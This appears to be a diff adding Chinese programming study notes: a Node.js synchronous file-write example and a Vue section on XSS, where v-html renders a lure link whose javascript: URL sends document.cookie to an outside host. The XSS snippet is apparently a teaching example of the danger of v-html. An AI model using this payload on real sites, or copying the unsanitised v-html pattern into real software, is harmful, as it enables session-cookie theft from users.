@@ -75,3 +75,37 @@ app.all("/",(request,response)=>{
   }
 })
     </script>
+	
+============================================================		
+	
+Nodejs:同步写入文件
+
+var fs = require("fs")
+
+//打开文件
+var fd = fs.openSync("hello.txt","w")
+
+//向文件中写入内容
+fs.writeSync(fd,'今天天气这不错~~~',2)
+
+//关闭文件
+fs.closeSync(fd)	
+============================================================	
+
+Vue:Xss跨脚本语言攻击
+  <div id="app">
+    <div v-html="str"></div>
+  </div>
+  
+  <script>
+  //计算属性实现搜索功能
+  const vm=new Vue({
+    el: '#app',
+    data:{
+      str:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到了你想看的资源</a>'
+    },
+  })
+
+  </script>
+============================================================	
+============================================================	
